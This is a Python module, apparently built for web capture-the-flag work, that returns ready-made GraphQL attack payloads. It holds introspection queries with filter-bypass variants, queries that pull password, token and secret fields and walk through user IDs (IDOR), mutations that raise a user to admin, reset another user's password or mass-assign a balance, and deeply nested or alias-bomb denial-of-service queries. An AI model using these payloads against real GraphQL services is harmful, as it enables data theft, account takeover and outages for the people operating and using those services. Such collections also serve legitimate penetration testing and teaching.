"""
GraphQL Injection & Introspection Payload Crafter for Web CTF.
Covers introspection queries, field/alias-based data extraction, and mutation abuse.
"""

from typing import List, Dict


def get_graphql_introspection_queries() -> List[Dict[str, str]]:
    """Generate GraphQL introspection queries to map the schema."""
    return [
        {
            "name": "Full Schema Introspection",
            "payload": """query {
  __schema {
    types {
      name
      fields {
        name
        type {
          name
          kind
        }
      }
    }
  }
}""",
            "desc": "Dumps the entire GraphQL schema including all types and fields."
        },
        {
            "name": "Query Type Introspection",
            "payload": """query {
  __type(name: "Query") {
    fields {
      name
      args {
        name
        type { name kind }
      }
    }
  }
}""",
            "desc": "Lists all available queries and their arguments."
        },
        {
            "name": "Mutation Type Introspection",
            "payload": """query {
  __type(name: "Mutation") {
    fields {
      name
      args {
        name
        type { name kind }
      }
    }
  }
}""",
            "desc": "Lists all available mutations (state-changing operations)."
        },
        {
            "name": "Introspection via Alias",
            "payload": """query {
  a: __schema { types { name } }
  b: __schema { queryType { name } }
}""",
            "desc": "Uses aliases to bypass naive introspection blocking."
        },
        {
            "name": "Introspection via Fragment",
            "payload": """query {
  __schema {
    ...FullType
  }
}
fragment FullType on __Schema {
  types { name }
}""",
            "desc": "Uses fragments to bypass introspection filters."
        }
    ]


def get_graphql_data_extraction_queries() -> List[Dict[str, str]]:
    """Generate GraphQL queries for data extraction and abuse."""
    return [
        {
            "name": "Field Enumeration (Common Fields)",
            "payload": """query {
  user(id: 1) {
    id
    username
    email
    password
    role
    isAdmin
    token
    secret
    flag
  }
}""",
            "desc": "Requests common sensitive fields that may not be in the UI."
        },
        {
            "name": "Alias-Based Bypass",
            "payload": """query {
  a: user(id: 1) { id username }
  b: user(id: 2) { id username }
  c: user(id: 3) { id username }
}""",
            "desc": "Uses aliases to query multiple records in one request."
        },
        {
            "name": "Batch Query (IDOR)",
            "payload": """query {
  u1: user(id: 1) { id username email }
  u2: user(id: 2) { id username email }
  u3: user(id: 3) { id username email }
  u4: user(id: 4) { id username email }
}""",
            "desc": "Batch queries to enumerate users (IDOR via GraphQL)."
        },
        {
            "name": "Directive-Based Bypass",
            "payload": """query {
  user(id: 1) {
    id
    username @include(if: true)
    password @skip(if: false)
  }
}""",
            "desc": "Uses @include/@skip directives to bypass field filters."
        },
        {
            "name": "Nested Query Abuse",
            "payload": """query {
  user(id: 1) {
    id
    posts { title content author { username password } }
  }
}""",
            "desc": "Nested queries to traverse relationships and access hidden data."
        }
    ]


def get_graphql_mutation_payloads() -> List[Dict[str, str]]:
    """Generate GraphQL mutation payloads for privilege escalation."""
    return [
        {
            "name": "Role Escalation Mutation",
            "payload": """mutation {
  updateUser(id: 1, input: { role: "admin", isAdmin: true }) {
    id
    role
  }
}""",
            "desc": "Attempts to escalate privileges via mutation."
        },
        {
            "name": "Password Reset Mutation",
            "payload": """mutation {
  resetPassword(id: 1, newPassword: "hacked") {
    id
  }
}""",
            "desc": "Attempts to reset another user's password."
        },
        {
            "name": "Mass Assignment Mutation",
            "payload": """mutation {
  updateProfile(input: { id: 1, role: "admin", balance: 999999 }) {
    id
    role
    balance
  }
}""",
            "desc": "Mass assignment to modify protected fields."
        }
    ]


def get_graphql_denial_of_service() -> List[Dict[str, str]]:
    """Generate GraphQL DoS payloads (deep nesting / aliases)."""
    return [
        {
            "name": "Deep Nested Query (DoS)",
            "payload": """query {
  user(id: 1) {
    friends { friends { friends { friends { friends { friends { id } } } } } }
  }
}""",
            "desc": "Deeply nested query to cause resource exhaustion."
        },
        {
            "name": "Alias Bomb (DoS)",
            "payload": """query {
  a1: user(id: 1) { id } a2: user(id: 1) { id } a3: user(id: 1) { id }
  a4: user(id: 1) { id } a5: user(id: 1) { id } a6: user(id: 1) { id }
  a7: user(id: 1) { id } a8: user(id: 1) { id } a9: user(id: 1) { id }
  a10: user(id: 1) { id }
}""",
            "desc": "Many aliases to amplify query cost."
        }
    ]
